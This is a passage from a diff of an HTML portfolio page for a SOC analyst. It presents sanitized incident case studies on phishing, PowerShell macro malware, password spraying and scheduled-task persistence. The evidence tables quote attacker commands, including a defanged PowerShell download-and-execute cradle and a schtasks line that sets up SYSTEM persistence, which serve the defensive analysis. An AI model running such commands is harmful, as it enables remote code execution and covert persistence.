-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
-                      <circle cx="12" cy="12" r="10" stroke="#7c3aed" stroke-width="2" fill="rgba(124, 58, 237, 0.12)"/>
-                      <polyline points="8 12 11 15 16 9" stroke="#7c3aed" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
-                    </svg>
-                  </div>
-                  <span><strong>Adversary TTP Mapping:</strong> Mapping all triage findings directly to MITRE ATT&CK tactics (T1059, T1078, T1566) for structured remediation playbooks.</span>
-                </li>
+          <!-- 6 Core Operational Pillars -->
+          <div class="exp-pillars-grid">
+            <div class="pillar-box">
+              <div class="pillar-icon">🚨</div>
+              <h4>Security Event Monitoring &amp; Triage</h4>
+              <p>24/7 continuous monitoring and triage of security alerts from Devo SIEM, Microsoft Sentinel, CrowdStrike Falcon, and Defender XDR. Validating suspicious activity and prioritizing alerts according to risk and business impact.</p>
+            </div>
+
+            <div class="pillar-box">
+              <div class="pillar-icon">🔍</div>
+              <h4>Incident Investigation</h4>
+              <p>Correlating multiple telemetry vectors: endpoint processes, user authentication records, network traffic, email flows, and threat intelligence to establish whether activity is legitimate, suspicious, or confirmed malicious.</p>
+            </div>
+
+            <div class="pillar-box">
+              <div class="pillar-icon">💻</div>
+              <h4>Endpoint Investigation</h4>
+              <p>Investigating detections using CrowdStrike Falcon and Defender XDR: process trees, command-line parameters, parent-child relationships, DLL injection, file hashes, and persistence registry artifacts.</p>
+            </div>
+
+            <div class="pillar-box">
+              <div class="pillar-icon">🔑</div>
+              <h4>Identity Investigation</h4>
+              <p>Analyzing Microsoft Entra ID (Azure AD) sign-in logs for brute-force patterns, distributed password spraying, impossible travel anomalies, suspicious user-agents, and unauthorized token access.</p>
+            </div>
+
+            <div class="pillar-box">
+              <div class="pillar-icon">📧</div>
+              <h4>Email Security &amp; Phishing</h4>
+              <p>Triage and containment of phishing campaigns, credential-harvesting URLs, weaponized attachments, and brand impersonation attempts using Avanan and Check Point Harmony gateways.</p>
+            </div>
+
+            <div class="pillar-box">
+              <div class="pillar-icon">🛡️</div>
+              <h4>Containment &amp; Remediation</h4>
+              <p>Executing tactical response playbooks: network host isolation via CrowdStrike Falcon, revoking active cloud sessions in Entra ID, resetting credentials, and purging phishing emails enterprise-wide.</p>
+            </div>
+
+            <div class="pillar-box">
+              <div class="pillar-icon">🌐</div>
+              <h4>Threat Intelligence</h4>
+              <p>Enriching raw indicators of compromise (IPs, domains, URLs, hashes) with VirusTotal, AbuseIPDB, and OSINT sources to establish reputation, infrastructure context, and adversary confidence.</p>
+            </div>
+
+            <div class="pillar-box">
+              <div class="pillar-icon">📝</div>
+              <h4>Documentation &amp; Reporting</h4>
+              <p>Authoring thorough investigation reports detailing timelines, attack vectors, impacted assets, root cause, containment actions, and strategic defense recommendations within ServiceNow.</p>
+            </div>
+
+            <div class="pillar-box">
+              <div class="pillar-icon">⏱️</div>
+              <h4>ITSM &amp; SLA Management</h4>
+              <p>Managing security incidents in ServiceNow while maintaining strict SLA compliance. Escalating verified high-severity incidents with pre-correlated evidence dossiers to Tier 3 and IR teams.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- =========================================================================
+         6. L2 CAPABILITIES SECTION ("What I Bring to an SOC L2 Role")
+         ========================================================================= -->
+    <section id="capabilities" class="content-section">
+      <div class="section-container">
+        <div class="section-header">
+          <span class="section-eyebrow">CAREER PROGRESSION</span>
+          <h2 class="section-heading">What I Bring to an SOC L2 Role</h2>
+          <p class="section-subtext">The analytical skills, investigative mindset, and engineering capabilities that bridge reactive tier-1 triage to senior defensive operations.</p>
+        </div>
+
+        <div class="capabilities-cards-grid">
+          <div class="capability-card">
+            <span class="cap-index">01</span>
+            <h4>Advanced Alert Triage</h4>
+            <p>Moving beyond simple alert acknowledgment by thoroughly validating underlying activity, determining confidence, assessing business severity, and scoping potential lateral expansion.</p>
+            <div class="cap-tech-pill">Confidence Scoring • Noise Filtering</div>
+          </div>
+
+          <div class="capability-card">
+            <span class="cap-index">02</span>
+            <h4>Incident Investigation</h4>
+            <p>Correlating evidence across SIEM, EDR, identity, email, network, and cloud telemetry to reconstruct the complete attack narrative and establish the true blast radius.</p>
+            <div class="cap-tech-pill">Multi-Source Correlation • Scope Analysis</div>
+          </div>
+
+          <div class="capability-card">
+            <span class="cap-index">03</span>
+            <h4>Threat Hunting</h4>
+            <p>Formulating hypothesis-driven hunting queries against security telemetry to proactively uncover stealthy adversary behavior and LOLBins execution that bypassed initial alerts.</p>
+            <div class="cap-tech-pill">Hypothesis-Driven • LOLBins Discovery</div>
+          </div>
+
+          <div class="capability-card">
+            <span class="cap-index">04</span>
+            <h4>Detection Engineering</h4>
+            <p>Authoring, testing, and deploying high-fidelity detection rules in KQL and Sigma mapped to the MITRE ATT&amp;CK framework, targeting attacker techniques over transient hashes.</p>
+            <div class="cap-tech-pill">KQL • Sigma • ATT&amp;CK Technique Mapping</div>
+          </div>
+
+          <div class="capability-card">
+            <span class="cap-index">05</span>
+            <h4>Detection Tuning</h4>
+            <p>Analyzing noisy alerts, evaluating legitimate administrative behavior, and refining query conditions and threshold exclusions to eliminate analyst fatigue without creating blind spots.</p>
+            <div class="cap-tech-pill">Noise Reduction • Signal Quality</div>
+          </div>
+
+          <div class="capability-card">
+            <span class="cap-index">06</span>
+            <h4>Root-Cause Analysis</h4>
+            <p>Constructing detailed event chronologies from first touchpoint to payload execution, determining initial access vectors, weaponization methods, and systemic vulnerabilities.</p>
+            <div class="cap-tech-pill">Attack Path Reconstruction • RCA</div>
+          </div>
+
+          <div class="capability-card">
+            <span class="cap-index">07</span>
+            <h4>Threat Intelligence</h4>
+            <p>Enriching indicators of compromise, tracking adversary TTPs, and translating external threat intelligence feeds into proactive internal detection queries and hunting leads.</p>
+            <div class="cap-tech-pill">IOC Enrichment • OSINT • TTP Profiling</div>
+          </div>
+
+          <div class="capability-card">
+            <span class="cap-index">08</span>
+            <h4>Incident Response</h4>
+            <p>Leading tactical containment, coordinating system and credential remediation, documenting the incident lifecycle in ServiceNow, and participating in post-incident reviews.</p>
+            <div class="cap-tech-pill">Host Isolation • Playbook Execution</div>
+          </div>
+
+          <div class="capability-card">
+            <span class="cap-index">09</span>
+            <h4>Security Automation</h4>
+            <p>Developing Python scripts and automated pipelines to parse telemetry, orchestrate multi-engine IOC reputation checks, and reduce repetitive manual investigation time by over 90%.</p>
+            <div class="cap-tech-pill">Python • REST APIs • Pipeline Automation</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- =========================================================================
+         7 & 8. INCIDENT INVESTIGATION LAB (Central Showcase)
+         ========================================================================= -->
+    <section id="investigations" class="content-section bg-surface-alt">
+      <div class="section-container">
+        <div class="section-header">
+          <span class="section-eyebrow">INCIDENT LAB</span>
+          <h2 class="section-heading">Incident Investigations</h2>
+          <p class="section-subtext">Evidence-driven analysis of suspicious activity, detection logic, scope, and response across 6 sanitized enterprise case studies.</p>
+          <div class="sanitized-notice">
+            <span>🔒 All investigations are sanitized defensive case studies and security lab scenarios protecting proprietary enterprise data.</span>
+          </div>
+        </div>
+
+        <!-- Case Switcher Tabs -->
+        <div class="investigation-tabs-row" role="tablist" aria-label="Incident Case Studies">
+          <button class="case-nav-btn active" role="tab" aria-selected="true" data-case="inc-001" onclick="switchCase('inc-001')">
+            <span class="case-badge high">HIGH</span>
+            <span class="case-nav-id">INC-001</span>
+            <span class="case-nav-title">Phishing &amp; Credential Theft</span>
+          </button>
+          <button class="case-nav-btn" role="tab" aria-selected="false" data-case="inc-002" onclick="switchCase('inc-002')">
+            <span class="case-badge high">HIGH</span>
+            <span class="case-nav-id">INC-002</span>
+            <span class="case-nav-title">Suspicious PowerShell</span>
+          </button>
+          <button class="case-nav-btn" role="tab" aria-selected="false" data-case="inc-003" onclick="switchCase('inc-003')">
+            <span class="case-badge medium">MEDIUM</span>
+            <span class="case-nav-id">INC-003</span>
+            <span class="case-nav-title">Password Spraying</span>
+          </button>
+          <button class="case-nav-btn" role="tab" aria-selected="false" data-case="inc-004" onclick="switchCase('inc-004')">
+            <span class="case-badge critical">CRITICAL</span>
+            <span class="case-nav-id">INC-004</span>
+            <span class="case-nav-title">Endpoint Malware</span>
+          </button>
+          <button class="case-nav-btn" role="tab" aria-selected="false" data-case="inc-005" onclick="switchCase('inc-005')">
+            <span class="case-badge high">HIGH</span>
+            <span class="case-nav-id">INC-005</span>
+            <span class="case-nav-title">Account Compromise / Travel</span>
+          </button>
+          <button class="case-nav-btn" role="tab" aria-selected="false" data-case="inc-006" onclick="switchCase('inc-006')">
+            <span class="case-badge high">HIGH</span>
+            <span class="case-nav-id">INC-006</span>
+            <span class="case-nav-title">Network C2 Communication</span>
+          </button>
+        </div>
+
+        <!-- ================= CASE 1: INC-001 ================= -->
+        <article id="inc-001" class="case-detail-panel active" role="tabpanel">
+          <div class="case-panel-header">
+            <div class="case-title-wrap">
+              <span class="case-id-tag">INC-001</span>
+              <h3>Phishing Campaign &amp; Credential Harvesting Triage</h3>
+            </div>
+            <div class="case-meta-group">
+              <span class="case-badge high">Severity: High</span>
+              <span class="case-cat-tag">Category: Email / Identity / Initial Access</span>
+              <span class="case-verdict-tag tp">Verdict: True Positive (Contained)</span>
+            </div>
+          </div>
+
+          <div class="case-body-grid">
+            <div class="case-section-card">
+              <h4><span class="icon">🚨</span> 01 — Alert &amp; Initial Assessment</h4>
+              <p>Avanan email security flagged an incoming email titled <em>"Urgent: Annual Benefits Enrollment Action Required"</em> received by 14 employees, containing an obfuscated hyperlink bypassing standard SafeLinks scanning.</p>
+
+              <h4 class="mt-4"><span class="icon">💡</span> 02 — Initial Hypothesis</h4>
+              <p>An external threat actor conducted a targeted spear-phishing campaign using an external lookalike domain to harvest corporate M365 credentials and initiate unauthorized session takeovers.</p>
+
+              <h4 class="mt-4"><span class="icon">📡</span> 03 — Investigation Sources</h4>
+              <div class="source-tags-wrap">
+                <span class="source-tag">Avanan Phishing Gateway</span>
+                <span class="source-tag">Microsoft Entra ID Sign-in Logs</span>
+                <span class="source-tag">Microsoft Sentinel SIEM</span>
+                <span class="source-tag">Defender XDR Web Protection</span>
+                <span class="source-tag">VirusTotal &amp; URLScan.io</span>
+              </div>
+            </div>
+
+            <div class="case-section-card">
+              <h4><span class="icon">📋</span> 04 — Sanitized Evidence Matrix</h4>
+              <div class="table-scroll-container">
+                <table class="clean-evidence-table">
+                  <thead>
+                    <tr>
+                      <th>Artifact</th>
+                      <th>Sanitized Observed Value</th>
+                      <th>Context &amp; Risk</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr>
+                      <td>Sender</td>
+                      <td><code>hr-benefits-portal@corp-benefits-auth[.]com</code></td>
+                      <td>Unregistered lookalike domain (SPF: Neutral, DMARC: None)</td>
+                    </tr>
+                    <tr>
+                      <td>Phishing URL</td>
+                      <td><code>hxxps://corp-benefits-auth[.]com/login?id=user402</code></td>
+                      <td>Cloned M365 credential harvester reverse proxy (Evilginx2 framework)</td>
+                    </tr>
+                    <tr>
+                      <td>Target User</td>
+                      <td><code>john.doe@enterprise-corp[.]com</code></td>
+                      <td>Clicked URL at 09:14 UTC; submitted corporate credentials and MFA push</td>
+                    </tr>
+                    <tr>
+                      <td>Attacker IP</td>
+                      <td><code>194.26.29[.]114</code> (Hosting: Stark Industries Solutions)</td>
+                      <td>Known malicious Tor exit node / VPN proxy with high AbuseIPDB score</td>
+                    </tr>
+                    <tr>
+                      <td>Anomalous Sign-in</td>
+                      <td>Entra ID: 09:28 UTC from Germany (User-Agent: HeadlessChrome)</td>
+                      <td>Bypassed legacy conditional access rule; active session cookie generated</td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+          </div>
+
+          <!-- Chronological Investigation Timeline -->
+          <div class="case-timeline-section">
+            <h4><span class="icon">⏳</span> 05 — Investigation Timeline</h4>
+            <div class="clean-timeline-row">
+              <div class="time-step">
+                <div class="time-stamp">09:02 UTC</div>
+                <div class="time-desc"><strong>Email Ingestion:</strong> 14 emails delivered with malicious URL bypassing basic spam filter.</div>
+              </div>
+              <div class="time-step active-step">
+                <div class="time-stamp">09:14 UTC</div>
+                <div class="time-desc"><strong>User Interaction:</strong> User <code>john.doe</code> opened email and clicked credential harvesting link.</div>
+              </div>
+              <div class="time-step">
+                <div class="time-stamp">09:22 UTC</div>
+                <div class="time-desc"><strong>IOC Enrichment:</strong> SOC Analyst enriched URL in URLScan.io, confirming fake M365 login portal.</div>
+              </div>
+              <div class="time-step alert-step">
+                <div class="time-stamp">09:28 UTC</div>
+                <div class="time-desc"><strong>Suspicious Sign-in:</strong> Attacker replayed stolen session cookie from German IP <code>194.26.29[.]114</code>.</div>
+              </div>
+              <div class="time-step success-step">
+                <div class="time-stamp">09:34 UTC</div>
+                <div class="time-desc"><strong>Tactical Containment:</strong> Revoked active user sessions, enforced password reset, purged emails globally.</div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Bottom Summary Cards -->
+          <div class="case-bottom-grid">
+            <div class="case-meta-box">
+              <h5>06 — ATT&amp;CK Mapping</h5>
+              <div class="mitre-badge-list">
+                <span class="mitre-chip">T1566.002 — Spearphishing Link</span>
+                <span class="mitre-chip">T1078.004 — Cloud Accounts</span>
+                <span class="mitre-chip">T1114.002 — Remote Email Access</span>
+              </div>
+              <h5 class="mt-3">08 &amp; 09 — Scope &amp; Root Cause</h5>
+              <p class="meta-desc">Employee submitted credentials to reverse proxy harvester. 1 user compromised, 13 targeted but benign. Zero data exfiltration confirmed via Unified Audit Logs.</p>
+            </div>
+
+            <div class="case-meta-box">
+              <h5>10 — Containment &amp; Response</h5>
+              <ul class="meta-bullets">
+                <li>Revoked all active refresh tokens &amp; sessions via Microsoft Entra ID PowerShell.</li>
+                <li>Enforced mandatory password reset with Authenticator number-matching MFA.</li>
+                <li>Triggered enterprise-wide mailbox sweep purging the phishing email across all 14 recipients.</li>
+                <li>Blocked sender domain and attacker IP range across perimeter firewalls.</li>
               </ul>
             </div>
+
+            <div class="case-meta-box">
+              <h5>11 &amp; 12 — Detection Tuning &amp; Analyst Takeaway</h5>
+              <p class="meta-desc">Configured KQL detection rule triggering on Entra ID sign-ins from anomalous ASNs within 60 minutes of URL clicks. Upgraded Conditional Access policy requiring Compliant Device check for all M365 web apps.</p>
+              <div class="takeaway-highlight">
+                <strong>Analyst Takeaway:</strong> Modern credential harvesting uses AiTM reverse proxies to bypass push notifications. Immediate token revocation and device-compliance enforcement are required for rapid containment.
+              </div>
+            </div>
+          </div>
+        </article>
+
+        <!-- ================= CASE 2: INC-002 ================= -->
+        <article id="inc-002" class="case-detail-panel" role="tabpanel">
+          <div class="case-panel-header">
+            <div class="case-title-wrap">
+              <span class="case-id-tag">INC-002</span>
+              <h3>Suspicious PowerShell Execution &amp; Download Cradle</h3>
+            </div>
+            <div class="case-meta-group">
+              <span class="case-badge high">Severity: High</span>
+              <span class="case-cat-tag">Category: Endpoint / Execution</span>
+              <span class="case-verdict-tag tp">Verdict: True Positive (Contained)</span>
+            </div>
+          </div>
+
+          <div class="case-body-grid">
+            <div class="case-section-card">
+              <h4><span class="icon">🚨</span> 01 — Alert &amp; Initial Assessment</h4>
+              <p>CrowdStrike Falcon detected encoded PowerShell execution with execution bypass parameters spawned by <code>WINWORD.EXE</code> on employee workstation <code>WS-ENG-089</code>.</p>
+
+              <h4 class="mt-4"><span class="icon">💡</span> 02 — Initial Hypothesis</h4>
+              <p>A malicious macro-enabled document was opened by a user, initiating an encoded PowerShell download cradle to retrieve and execute an unmanaged remote stage-2 payload into memory.</p>
+
+              <h4 class="mt-4"><span class="icon">📡</span> 03 — Investigation Sources</h4>
+              <div class="source-tags-wrap">
+                <span class="source-tag">CrowdStrike Falcon EDR</span>
+                <span class="source-tag">Windows Event Logs (4688, 4104)</span>
+                <span class="source-tag">Sysmon Telemetry (Event 1 &amp; 3)</span>
+                <span class="source-tag">Devo SIEM</span>
+                <span class="source-tag">VirusTotal API</span>
+              </div>
+            </div>
+
+            <div class="case-section-card">
+              <h4><span class="icon">📋</span> 04 — Sanitized Evidence Matrix</h4>
+              <div class="table-scroll-container">
+                <table class="clean-evidence-table">
+                  <thead>
+                    <tr>
+                      <th>Artifact</th>
+                      <th>Sanitized Observed Value</th>
+                      <th>Context &amp; Risk</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr>
+                      <td>Parent Process</td>
+                      <td><code>C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</code> (PID: 6420)</td>
+                      <td>Abnormal parent for system scripting utilities</td>
+                    </tr>
+                    <tr>
+                      <td>Child Process</td>
+                      <td><code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code> (PID: 8812)</td>
+                      <td>Spawned directly by Word process thread</td>
+                    </tr>
+                    <tr>
+                      <td>Decoded Command</td>
+                      <td><code>powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgAK...</code></td>
+                      <td>Decodes to: <code>IEX(New-Object Net.WebClient).DownloadString('hxxp://185.196.8[.]22/stg.ps1')</code></td>
+                    </tr>
+                    <tr>
+                      <td>Outbound Connection</td>
+                      <td>Dest IP: <code>185.196.8[.]22:8080</code> (Sysmon Event ID 3)</td>
+                      <td>Known Cobalt Strike C2 team server infrastructure</td>
+                    </tr>
+                    <tr>
+                      <td>Dropped Hash</td>
+                      <td><code>e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</code></td>
+                      <td>Unsigned payload detected in <code>%TEMP%\update_agent.dll</code></td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+          </div>
+
+          <div class="case-timeline-section">
+            <h4><span class="icon">⏳</span> 05 — Investigation Timeline</h4>
+            <div class="clean-timeline-row">
+              <div class="time-step">
+                <div class="time-stamp">14:10 UTC</div>
+                <div class="time-desc"><strong>Macro Execution:</strong> User opened invoice attachment; VBA macro invoked <code>ShellExecute</code>.</div>
+              </div>
+              <div class="time-step alert-step">
+                <div class="time-stamp">14:11 UTC</div>
+                <div class="time-desc"><strong>Base64 PowerShell:</strong> PowerShell spawned with hidden window and execution bypass flags.</div>
+              </div>
+              <div class="time-step">
+                <div class="time-stamp">14:12 UTC</div>
+                <div class="time-desc"><strong>C2 Beacon Attempt:</strong> Outbound connection initiated to remote IP <code>185.196.8[.]22:8080</code>.</div>
+              </div>
+              <div class="time-step">
+                <div class="time-stamp">14:14 UTC</div>
+                <div class="time-desc"><strong>Script Block Extraction:</strong> Windows Event ID 4104 recovered deobfuscated payload script from memory.</div>
+              </div>
+              <div class="time-step success-step">
+                <div class="time-stamp">14:16 UTC</div>
+                <div class="time-desc"><strong>EDR Host Isolation:</strong> Host <code>WS-ENG-089</code> network isolated via Falcon; PID 8812 terminated.</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="case-bottom-grid">
+            <div class="case-meta-box">
+              <h5>06 — ATT&amp;CK Mapping</h5>
+              <div class="mitre-badge-list">
+                <span class="mitre-chip">T1059.001 — PowerShell</span>
+                <span class="mitre-chip">T1204.002 — Malicious File</span>
+                <span class="mitre-chip">T1105 — Ingress Tool Transfer</span>
+              </div>
+              <h5 class="mt-3">08 &amp; 09 — Scope &amp; Root Cause</h5>
+              <p class="meta-desc">Workstation <code>WS-ENG-089</code> infected via weaponized Word document macro. Isolated before lateral movement could occur.</p>
+            </div>
+
+            <div class="case-meta-box">
+              <h5>10 — Containment &amp; Response</h5>
+              <ul class="meta-bullets">
+                <li>Isolated workstation immediately via CrowdStrike Falcon real-time response.</li>
+                <li>Terminated rogue PowerShell process tree and deleted dropped payload in <code>%TEMP%</code>.</li>
+                <li>Extracted full memory dump for forensic analysis before reimaging host.</li>
+                <li>Pushed enterprise Group Policy disabling Office macro execution from untrusted paths.</li>
+              </ul>
+            </div>
+
+            <div class="case-meta-box">
+              <h5>11 &amp; 12 — Detection Tuning &amp; Analyst Takeaway</h5>
+              <p class="meta-desc">Authored Sigma &amp; KQL detection for Office applications spawning scripting shells. Tuned existing script-block logging alert to whitelist verified IT deployment paths.</p>
+              <div class="takeaway-highlight">
+                <strong>Analyst Takeaway:</strong> Decoding Base64 command strings immediately reveals attacker infrastructure. Script Block Logging (Event ID 4104) is essential to capture deobfuscated code executed in memory.
+              </div>
+            </div>
+          </div>
+        </article>
+
+        <!-- ================= CASE 3: INC-003 ================= -->
+        <article id="inc-003" class="case-detail-panel" role="tabpanel">
+          <div class="case-panel-header">
+            <div class="case-title-wrap">
+              <span class="case-id-tag">INC-003</span>
+              <h3>Distributed Cloud Password Spraying Correlation</h3>
+            </div>
+            <div class="case-meta-group">
+              <span class="case-badge medium">Severity: Medium</span>
+              <span class="case-cat-tag">Category: Identity / Credential Access</span>
+              <span class="case-verdict-tag tp">Verdict: True Positive (Blocked)</span>
+            </div>
+          </div>
+
+          <div class="case-body-grid">
+            <div class="case-section-card">
+              <h4><span class="icon">🚨</span> 01 — Alert &amp; Initial Assessment</h4>
+              <p>Microsoft Sentinel alert: <em>"Anomalous spike in Failed Sign-ins (Event 50126) across multiple user principals from rotating IP addresses"</em> over a 2-hour window.</p>
+
+              <h4 class="mt-4"><span class="icon">💡</span> 02 — Initial Hypothesis</h4>
+              <p>An external threat actor launched a low-and-slow distributed password spray attack across active enterprise accounts using common seasonal passwords to avoid account lockouts.</p>
+
+              <h4 class="mt-4"><span class="icon">📡</span> 03 — Investigation Sources</h4>
+              <div class="source-tags-wrap">
+                <span class="source-tag">Microsoft Entra ID SigninLogs</span>
+                <span class="source-tag">Microsoft Sentinel SIEM (KQL)</span>
+                <span class="source-tag">AbuseIPDB Threat Intelligence</span>
+                <span class="source-tag">ServiceNow Identity Tickets</span>
+              </div>
+            </div>
+
+            <div class="case-section-card">
+              <h4><span class="icon">📋</span> 04 — Sanitized Evidence Matrix</h4>
+              <div class="table-scroll-container">
+                <table class="clean-evidence-table">
+                  <thead>
+                    <tr>
+                      <th>Artifact</th>
+                      <th>Sanitized Observed Value</th>
+                      <th>Context &amp; Risk</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr>
+                      <td>Spray Scope</td>
+                      <td>62 distinct user accounts targeted</td>
+                      <td>Targeted accounts across Sales &amp; Operations</td>
+                    </tr>
+                    <tr>
+                      <td>Failure Code</td>
+                      <td>ErrorCode 50126 (Invalid Username or Password)</td>
+                      <td>Exact pattern: 1 failed attempt per account per 30 minutes</td>
+                    </tr>
+                    <tr>
+                      <td>Source Infrastructure</td>
+                      <td>47 distinct residential IP proxies across 8 ASNs</td>
+                      <td>Rotating proxy network designed to evade single-IP rate limits</td>
+                    </tr>
+                    <tr>
+                      <td>Target Protocol</td>
+                      <td>Legacy IMAP / POP3 Basic Authentication endpoints</td>
+                      <td>Attempted to bypass Conditional Access MFA policies</td>
+                    </tr>
+                    <tr>
+                      <td>Success Rate</td>
+                      <td>0 successful logins observed across all targets</td>
+                      <td>Smart Lockout and Conditional Access successfully blocked access</td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+          </div>
+
+          <div class="case-timeline-section">
+            <h4><span class="icon">⏳</span> 05 — Investigation Timeline</h4>
+            <div class="clean-timeline-row">
+              <div class="time-step">
+                <div class="time-stamp">02:15 UTC</div>
+                <div class="time-desc"><strong>Spray Inception:</strong> Low-frequency authentication attempts began hitting legacy exchange endpoints.</div>
+              </div>
+              <div class="time-step">
+                <div class="time-stamp">03:40 UTC</div>
+                <div class="time-desc"><strong>Threshold Correlation:</strong> Sentinel KQL query identified 60+ users failing with identical error code.</div>
+              </div>
+              <div class="time-step alert-step">
+                <div class="time-stamp">03:52 UTC</div>
+                <div class="time-desc"><strong>Analyst Triage:</strong> Verified no single user experienced lockout; identified low-and-slow spray.</div>
+              </div>
+              <div class="time-step success-step">
+                <div class="time-stamp">04:10 UTC</div>
+                <div class="time-desc"><strong>Tenant Hardening:</strong> Disabled legacy authentication protocols tenant-wide and enforced Conditional Access.</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="case-bottom-grid">
+            <div class="case-meta-box">
+              <h5>06 — ATT&amp;CK Mapping</h5>
+              <div class="mitre-badge-list">
+                <span class="mitre-chip">T1110.003 — Password Spraying</span>
+                <span class="mitre-chip">T1078.004 — Cloud Accounts</span>
+              </div>
+              <h5 class="mt-3">08 &amp; 09 — Scope &amp; Root Cause</h5>
+              <p class="meta-desc">62 user accounts targeted. 0 compromised. Threat actor sought access via legacy authentication endpoints.</p>
+            </div>
+
+            <div class="case-meta-box">
+              <h5>10 — Containment &amp; Response</h5>
+              <ul class="meta-bullets">
+                <li>Implemented Microsoft Entra ID Smart Lockout with aggressive lockout duration.</li>
+                <li>Completely deprecated and disabled legacy POP/IMAP authentication across the tenant.</li>
+                <li>Blocked identified residential proxy CIDR blocks via Conditional Access named locations.</li>
+              </ul>
+            </div>
+
+            <div class="case-meta-box">
+              <h5>11 &amp; 12 — Detection Tuning &amp; Analyst Takeaway</h5>
+              <p class="meta-desc">Constructed multi-entity KQL query correlating failed logins across distinct accounts within 1 hour. Configured automated notification alerting Tier 2 when distinct failed usernames &gt; 25.</p>
+              <div class="takeaway-highlight">
+                <strong>Analyst Takeaway:</strong> Attackers distribute attempts across residential IPs to evade per-IP thresholds. Telemetry correlation must aggregate on user populations rather than source IP alone.
+              </div>
+            </div>
+          </div>
+        </article>
+
+        <!-- ================= CASE 4: INC-004 ================= -->
+        <article id="inc-004" class="case-detail-panel" role="tabpanel">
+          <div class="case-panel-header">
+            <div class="case-title-wrap">
+              <span class="case-id-tag">INC-004</span>
+              <h3>Endpoint Malware &amp; Scheduled Task Persistence</h3>
+            </div>
+            <div class="case-meta-badge">
+              <span class="case-badge critical">Severity: Critical</span>
+              <span class="case-cat-tag">Category: Malware / Persistence</span>
+              <span class="case-verdict-tag tp">Verdict: True Positive (Contained)</span>
+            </div>
+          </div>
+
+          <div class="case-body-grid">
+            <div class="case-section-card">
+              <h4><span class="icon">🚨</span> 01 — Alert &amp; Initial Assessment</h4>
+              <p>Microsoft Defender XDR triggered a high-severity alert: <em>"Suspicious binary dropped into AppData\Roaming with immediate Scheduled Task creation (Event 4698)"</em> on server <code>SRV-SQL-PROD02</code>.</p>
+
+              <h4 class="mt-4"><span class="icon">💡</span> 02 — Initial Hypothesis</h4>
+              <p>An adversary leveraged compromised credentials to access an internal database server, drop a backdoor binary, and establish persistent survivability across system reboots.</p>
+
+              <h4 class="mt-4"><span class="icon">📡</span> 03 — Investigation Sources</h4>
+              <div class="source-tags-wrap">
+                <span class="source-tag">Microsoft Defender XDR</span>
+                <span class="source-tag">Windows Security Logs (4698, 4624)</span>
+                <span class="source-tag">Sysmon Event ID 1 &amp; 11</span>
+                <span class="source-tag">Microsoft Sentinel KQL</span>
+                <span class="source-tag">VirusTotal API</span>
+              </div>
+            </div>
+
+            <div class="case-section-card">
+              <h4><span class="icon">📋</span> 04 — Sanitized Evidence Matrix</h4>
+              <div class="table-scroll-container">
+                <table class="clean-evidence-table">
+                  <thead>
+                    <tr>
+                      <th>Artifact</th>
+                      <th>Sanitized Observed Value</th>
+                      <th>Context &amp; Risk</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr>
+                      <td>Dropped Path</td>
+                      <td><code>C:\Users\svc_sqladmin\AppData\Roaming\winupdate.exe</code></td>
+                      <td>Masquerading as Windows Update binary in non-system directory</td>
+                    </tr>
+                    <tr>
+                      <td>SHA-256 Hash</td>
+                      <td><code>7d5b8f2...b841a</code> (Known Cobalt Strike Beacon loader)</td>
+                      <td>58/72 engines flagged malicious on VirusTotal</td>
+                    </tr>
+                    <tr>
+                      <td>Persistence Task</td>
+                      <td>Task Name: <code>Microsoft\Windows\WinUpdateCheck</code> (Event ID 4698)</td>
+                      <td>Configured to execute every 15 minutes as <code>SYSTEM</code></td>
+                    </tr>
+                    <tr>
+                      <td>Command Line</td>
+                      <td><code>schtasks.exe /create /tn "WinUpdateCheck" /tr "...\winupdate.exe" /sc minute /mo 15 /ru "SYSTEM"</code></td>
+                      <td>High-privilege persistence established via command shell</td>
+                    </tr>
+                    <tr>
+                      <td>C2 Callback</td>
+                      <td><code>hxxp://cloud-sync-telemetry[.]net/api/v1/ping</code></td>
+                      <td>Dynamic DNS domain registered 48 hours prior to attack</td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+          </div>
+
+          <div class="case-timeline-section">
+            <h4><span class="icon">⏳</span> 05 — Investigation Timeline</h4>
+            <div class="clean-timeline-row">
+              <div class="time-step">
+                <div class="time-stamp">22:04 UTC</div>
+                <div class="time-desc"><strong>Lateral Logon:</strong> RDP session established from workstation <code>WS-FIN-012</code> using service account.</div>
+              </div>
+              <div class="time-step alert-step">
+                <div class="time-stamp">22:08 UTC</div>
+                <div class="time-desc"><strong>Payload Drop:</strong> Binary <code>winupdate.exe</code> dropped into user AppData folder via SMB transfer.</div>
+              </div>
+              <div class="time-step alert-step">
+                <div class="time-stamp">22:09 UTC</div>
+                <div class="time-desc"><strong>Scheduled Task:</strong> Scheduled task created to guarantee SYSTEM persistence across reboots.</div>
+              </div>
+              <div class="time-step">
+                <div class="time-stamp">22:15 UTC</div>
+                <div class="time-desc"><strong>SOC Triage:</strong> Analyst verified binary hash on VirusTotal and confirmed beaconing behavior.</div>
+              </div>
+              <div class="time-step success-step">
+                <div class="time-stamp">22:21 UTC</div>
+                <div class="time-desc"><strong>Host Containment:</strong> Isolated <code>SRV-SQL-PROD02</code> &amp; origin host; removed task and terminated process.</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="case-bottom-grid">
+            <div class="case-meta-box">
+              <h5>06 — ATT&amp;CK Mapping</h5>
+              <div class="mitre-badge-list">
+                <span class="mitre-chip">T1053.005 — Scheduled Task</span>
